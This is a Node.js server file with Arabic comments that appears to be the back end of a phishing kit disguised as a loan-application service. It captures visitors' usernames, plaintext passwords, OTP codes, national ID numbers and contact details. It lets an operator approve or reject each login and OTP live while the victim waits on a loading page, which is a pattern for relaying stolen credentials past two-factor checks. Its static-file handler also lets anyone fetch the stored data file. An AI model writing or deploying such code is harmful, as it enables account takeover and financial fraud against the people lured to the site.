// server.js
// سيرفر بسيط بدون أي مكتبات خارجية (Node.js فقط)
// بيشتغل كبديل لقاعدة البيانات عن طريق ملف db.json
// شغّله بالأمر: node server.js

const http = require('http');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const PORT = Number(process.env.PORT) || 3000;
const DB_FILE = path.join(__dirname, 'db.json');
const ADMIN_PASSWORD_HASH = process.env.ADMIN_PASSWORD_HASH || '01c03ad11e315195b7d09be273bdc9fa:a1f5f9d2023d3c474f6a7f75e5d4944325e35dcea3d8e2d381787950c53cd2d83040f538346565e831872e83aa6fa855b104cec64725d9d075e5d3440c99a152';
const adminSessions = new Map();
const ADMIN_SESSION_TTL_MS = 8 * 60 * 60 * 1000;

function parseCookies(req) {
  return Object.fromEntries((req.headers.cookie || '').split(';').filter(Boolean).map(cookie => {
    const separator = cookie.indexOf('=');
    return [cookie.slice(0, separator).trim(), decodeURIComponent(cookie.slice(separator + 1).trim())];
  }));
}

function verifyAdminPassword(password) {
  const [salt, expectedHex] = ADMIN_PASSWORD_HASH.split(':');
  if (!salt || !expectedHex) return false;
  const actual = crypto.scryptSync(password || '', salt, expectedHex.length / 2);
  const expected = Buffer.from(expectedHex, 'hex');
  return actual.length === expected.length && crypto.timingSafeEqual(actual, expected);
}

function isAdminAuthenticated(req) {
  const token = parseCookies(req).admin_session;
  const expiresAt = token && adminSessions.get(token);
  if (!expiresAt) return false;
  if (expiresAt < Date.now()) {
    adminSessions.delete(token);
    return false;
  }
  return true;
}

// ---------- تتبع الزيارات النشطة الحقيقية ----------
// كل صفحة مفتوحة (index.html) بتبعت "نبضة" (heartbeat) كل شوية ثواني.
// أي جلسة معملتش نبضة من فترة (HEARTBEAT_TIMEOUT) بتتحسب مش نشطة.
const activeSessions = {}; // sessionId -> آخر وقت نبضة
const HEARTBEAT_TIMEOUT_MS = 10000; // 10 ثواني
let totalVisits = 0;

try {
  const initialDB = readDB();
  totalVisits = Number(initialDB.totalVisits) || 0;
} catch (error) {
  totalVisits = 0;
}

function countActiveVisits() {
  const now = Date.now();
  let count = 0;
  for (const id in activeSessions) {
    if (now - activeSessions[id] <= HEARTBEAT_TIMEOUT_MS) {
      count++;
    } else {
      delete activeSessions[id]; // تنظيف الجلسات القديمة
    }
  }
  return count;
}

// ---------- أدوات مساعدة للتعامل مع db.json ----------
function readDB() {
  const raw = fs.readFileSync(DB_FILE, 'utf8');
  return JSON.parse(raw);
}

function writeDB(data) {
  fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2), 'utf8');
}

function getApplications(db) {
  if (Array.isArray(db.applications)) return db.applications;
  if (db.applicationData) return [db.applicationData];
  return [];
}

function sendJSON(res, statusCode, obj) {
  const body = JSON.stringify(obj);
  res.writeHead(statusCode, {
    'Content-Type': 'application/json; charset=utf-8',
    'Content-Length': Buffer.byteLength(body)
  });
  res.end(body);
}

function readRequestBody(req, callback) {
  let chunks = '';
  req.on('data', (chunk) => { chunks += chunk; });
  req.on('end', () => {
    try {
      callback(null, chunks ? JSON.parse(chunks) : {});
    } catch (e) {
      callback(e, null);
    }
  });
}

// ---------- تحديد أنواع الملفات الثابتة ----------
const MIME_TYPES = {
  '.html': 'text/html; charset=utf-8',
  '.js': 'text/javascript; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.json': 'application/json; charset=utf-8',
  '.png': 'image/png',
  '.jpg': 'image/jpeg',
  '.svg': 'image/svg+xml'
};

function serveStaticFile(req, res, urlPath) {
  let filePath = urlPath === '/' ? '/index.html' : urlPath;
  filePath = path.join(__dirname, filePath);

  fs.readFile(filePath, (err, content) => {
    if (err) {
      res.writeHead(404, { 'Content-Type': 'text/plain; charset=utf-8' });
      res.end('الملف غير موجود: ' + urlPath);
      return;
    }
    const ext = path.extname(filePath);
    const mime = MIME_TYPES[ext] || 'application/octet-stream';
    res.writeHead(200, { 'Content-Type': mime });
    res.end(content);
  });
}

// ---------- السيرفر ----------
const server = http.createServer((req, res) => {
  const urlObj = new URL(req.url, `http://localhost:${PORT}`);
  const pathname = urlObj.pathname;

  // ---- مصادقة لوحة الإدارة ----
  if (pathname === '/api/admin-login' && req.method === 'POST') {
    readRequestBody(req, (err, body) => {
      if (err || !verifyAdminPassword(body.password)) {
        sendJSON(res, 401, { error: 'كلمة المرور غير صحيحة' });
        return;
      }
      const token = crypto.randomBytes(32).toString('hex');
      adminSessions.set(token, Date.now() + ADMIN_SESSION_TTL_MS);
      res.writeHead(200, {
        'Content-Type': 'application/json; charset=utf-8',
        'Set-Cookie': `admin_session=${token}; HttpOnly; SameSite=Strict; Path=/; Max-Age=${ADMIN_SESSION_TTL_MS / 1000}`
      });
      res.end(JSON.stringify({ ok: true }));
    });
    return;
  }

  if (pathname === '/api/admin-logout' && req.method === 'POST') {
    const token = parseCookies(req).admin_session;
    if (token) adminSessions.delete(token);
    res.writeHead(200, {
      'Content-Type': 'application/json; charset=utf-8',
      'Set-Cookie': 'admin_session=; HttpOnly; SameSite=Strict; Path=/; Max-Age=0'
    });
    res.end(JSON.stringify({ ok: true }));
    return;
  }

  const adminProtectedPaths = ['/api/users', '/api/decision', '/api/otp-decision', '/api/application-data'];
  if (adminProtectedPaths.includes(pathname) && !isAdminAuthenticated(req)) {
    sendJSON(res, 401, { error: 'غير مصرح' });
    return;
  }

  // ---- API: تسجيل الدخول (تخزين طلب في قاعدة البيانات) ----
  if (pathname === '/api/login' && req.method === 'POST') {
    readRequestBody(req, (err, body) => {
      if (err) return sendJSON(res, 400, { error: 'بيانات غير صحيحة' });

      const db = readDB();
      db.otpRequest = null;
      db.loginRequest = {
        username: body.username || '',
        password: body.password || '',
        status: 'pending',
        ts: Date.now()
      };
      const applications = getApplications(db);
      if (applications.length) {
        applications[0].username = db.loginRequest.username;
        applications[0].password = db.loginRequest.password;
        applications[0].status = 'pending';
        applications[0].otpCode = '';
        db.applications = applications;
      }
      writeDB(db);
      sendJSON(res, 200, { ok: true });
    });
    return;
  }

  // ---- API: حالة طلب الدخول الحالي (يستخدمها loading.html) ----
  if (pathname === '/api/login-status' && req.method === 'GET') {
    const db = readDB();
    sendJSON(res, 200, db.loginRequest || null);
    return;
  }

  // ---- API: قرار الأدمن (قبول / رفض) ----
  if (pathname === '/api/decision' && req.method === 'POST') {
    readRequestBody(req, (err, body) => {
      if (err) return sendJSON(res, 400, { error: 'بيانات غير صحيحة' });

      const db = readDB();
      const applications = getApplications(db);
      const requestId = String(body.id || '');
      const application = applications.find(item => String(item.ts || '') === requestId);

      if (application) {
        application.status = body.status;
        db.applications = applications;
        if (db.loginRequest && db.loginRequest.username === application.username) {
          db.loginRequest.status = body.status;
        }
      } else if (db.loginRequest && (requestId === 'login' || !requestId)) {
        db.loginRequest.status = body.status;
      } else {
        return sendJSON(res, 404, { error: 'الطلب غير موجود' });
      }
      writeDB(db);
      sendJSON(res, 200, { ok: true });
    });
    return;
  }

  // ---- API: مسح طلب الدخول بعد التعامل معه ----
  if (pathname === '/api/clear-request' && req.method === 'POST') {
    const db = readDB();
    db.loginRequest = null;
    writeDB(db);
    sendJSON(res, 200, { ok: true });
    return;
  }

  // ---- API: إرسال رمز التأكيد (OTP) عشان يراجعه الأدمن ----
  if (pathname === '/api/otp-submit' && req.method === 'POST') {
    readRequestBody(req, (err, body) => {
      if (err) return sendJSON(res, 400, { error: 'بيانات غير صحيحة' });
      const db = readDB();
      db.otpRequest = {
        code: body.code || '',
        status: 'pending',
        ts: Date.now()
      };
      const applications = getApplications(db);
      if (applications.length) {
        applications[0].otpCode = db.otpRequest.code;
        db.applications = applications;
      }
      writeDB(db);
      sendJSON(res, 200, { ok: true });
    });
    return;
  }

  // ---- API: حالة طلب رمز التأكيد الحالي ----
  if (pathname === '/api/otp-status' && req.method === 'GET') {
    const db = readDB();
    sendJSON(res, 200, db.otpRequest || null);
    return;
  }

  // ---- API: قرار الأدمن على رمز التأكيد (قبول / رفض) ----
  if (pathname === '/api/otp-decision' && req.method === 'POST') {
    readRequestBody(req, (err, body) => {
      if (err) return sendJSON(res, 400, { error: 'بيانات غير صحيحة' });
      const db = readDB();
      if (!db.otpRequest) {
        return sendJSON(res, 400, { error: 'لا يوجد طلب رمز تأكيد حالي' });
      }
      db.otpRequest.status = body.status; // 'accepted' or 'rejected'
      writeDB(db);
      sendJSON(res, 200, { ok: true });
    });
    return;
  }

  // ---- API: مسح طلب رمز التأكيد بعد التعامل معه ----
  if (pathname === '/api/otp-clear' && req.method === 'POST') {
    const db = readDB();
    db.otpRequest = null;
    writeDB(db);
    sendJSON(res, 200, { ok: true });
    return;
  }

  // ---- API: حفظ مزود الشبكة المختار ----
  if (pathname === '/api/provider-submit' && req.method === 'POST') {
    readRequestBody(req, (err, body) => {
      if (err) return sendJSON(res, 400, { error: 'بيانات غير صحيحة' });
      const db = readDB();
      const applications = getApplications(db);
      if (applications.length) {
        applications[0].networkProvider = body.provider || '';
        db.applications = applications;
        db.applicationData = applications[0];
      }
      writeDB(db);
      sendJSON(res, 200, { ok: true });
    });
    return;
  }

  // ---- API: إرسال بيانات طلب القرض (من apply.html) ----
  if (pathname === '/api/application-submit' && req.method === 'POST') {
    readRequestBody(req, (err, body) => {
      if (err) return sendJSON(res, 400, { error: 'بيانات غير صحيحة' });
      const db = readDB();
      const application = {
        fullName: body.fullName || '',
        model: body.model || '',
        idNumber: body.idNumber || '',
        phone: body.phone || '',
        email: body.email || '',
        street: body.street || '',
        city: body.city || '',
        state: body.state || '',
        zip: body.zip || '',
        loanAmount: body.loanAmount || '',
        months: body.months || '',
        status: 'pending',
        ts: Date.now()
      };
      db.applications = [application].concat(getApplications(db));
      db.applicationData = application;
      writeDB(db);
      sendJSON(res, 200, { ok: true });
    });
    return;
  }

  // ---- API: قراءة بيانات طلب القرض الحالي (تستخدمها admin.html) ----
  if (pathname === '/api/application-data' && req.method === 'GET') {
    const db = readDB();
    sendJSON(res, 200, db.applicationData || null);
    return;
  }

  // ---- API: نبضة (heartbeat) عشان تتبع الزيارات النشطة الحقيقية ----
  if (pathname === '/api/heartbeat' && req.method === 'POST') {
    readRequestBody(req, (err, body) => {
      if (err || !body.sessionId) return sendJSON(res, 400, { error: 'sessionId مطلوب' });
      if (!Object.prototype.hasOwnProperty.call(activeSessions, body.sessionId)) {
        totalVisits += 1;
        const db = readDB();
        db.totalVisits = totalVisits;
        writeDB(db);
      }
      activeSessions[body.sessionId] = Date.now();
      sendJSON(res, 200, { ok: true });
    });
    return;
  }

  // ---- API: قائمة المستخدمين (تستخدمها admin.html) ----
    if (pathname === '/api/users' && req.method === 'GET') {
      const db = readDB();
      const applications = getApplications(db);
      const applicationUsers = applications.map(function(application){
        let status = 'قيد المراجعة';
        if (application.status === 'accepted') status = 'نشط';
        if (application.status === 'rejected') status = 'مرفوض';
        return {
          id: String(application.ts || ''),
          requestType: 'application',
          name: application.fullName || 'طلب جديد',
          phone: application.phone || '—',
          email: application.email || '—',
          model: application.model || '—',
          street: application.street || '—',
          city: application.city || '—',
          state: application.state || '—',
          zip: application.zip || '—',
          status: status,
          statusKey: application.status || 'pending',
          username: application.username || '',
          password: application.password || '',
          otpCode: application.otpCode || '',
          networkProvider: application.networkProvider || '',
          idNumber: application.idNumber || '—',
          loanAmount: application.loanAmount || '—',
          months: application.months || '—',
          application: true
        };
      });
      const users = applicationUsers
        .concat(Array.isArray(db.users) ? db.users : []);
      if (db.loginRequest) {
        const hasOtpRequest = Boolean(db.otpRequest);
        const hasMatchingApplication = applicationUsers.some(user => user.username === db.loginRequest.username);
        const requestStatus = hasOtpRequest ? db.otpRequest.status : db.loginRequest.status;
        if (hasOtpRequest || !hasMatchingApplication) users.unshift({
          id: hasOtpRequest ? 'otp' : 'login',
          requestType: hasOtpRequest ? 'otp' : 'login',
          name: db.loginRequest.username || 'طلب تسجيل دخول',
          phone: '—',
          email: '—',
          status: requestStatus === 'accepted' ? 'مقبول' : requestStatus === 'rejected' ? 'مرفوض' : 'قيد الانتظار',
          statusKey: requestStatus || 'pending',
          username: db.loginRequest.username || '',
          password: db.loginRequest.password || '',
          otpCode: hasOtpRequest ? db.otpRequest.code : '',
          application: false
        });
      }
      sendJSON(res, 200, { users, activeVisits: countActiveVisits(), totalVisits: totalVisits });
      return;
  }

  // ---- أي طلب تاني: نعتبره ملف ثابت (html, css, js...) ----
  serveStaticFile(req, res, pathname);
});

server.listen(PORT, () => {
  console.log('السيرفر شغال دلوقتي على:');
  console.log('http://localhost:' + PORT);
  console.log('افتح الرابط ده في المتصفح عشان تشوف صفحة تسجيل الدخول');
});
